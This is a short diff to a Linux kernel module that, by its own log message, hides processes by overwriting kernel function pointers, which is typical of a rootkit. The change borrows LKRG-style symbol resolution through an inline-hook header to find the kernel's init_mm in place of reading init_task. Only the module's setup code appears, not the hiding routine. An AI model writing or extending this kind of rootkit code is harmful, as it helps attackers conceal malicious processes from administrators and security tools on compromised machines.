@@ -1,4 +1,5 @@
 #include "hide_proc.h"
+#include "inline_hook/p_lkrg_main.h"
 #include <linux/module.h>
 #include <linux/kernel.h>
 #include <linux/version.h>
@@ -260,9 +261,8 @@ int hide_proc_init(void) {
 
     printk(KERN_INFO "[hide_proc] Initializing process hiding (function pointer overwrite)\n");
 
-    kernel_mm = init_task.active_mm;
-    if (!kernel_mm) {
-        printk(KERN_ERR "[hide_proc] Failed to get kernel mm_struct from init_task.\n");
+    if (!P_SYM(p_init_mm)) {
+        printk(KERN_ERR "[hide_proc] Failed to get kernel mm_struct from inline_hook module.\n");
         return -EFAULT;
     }
 
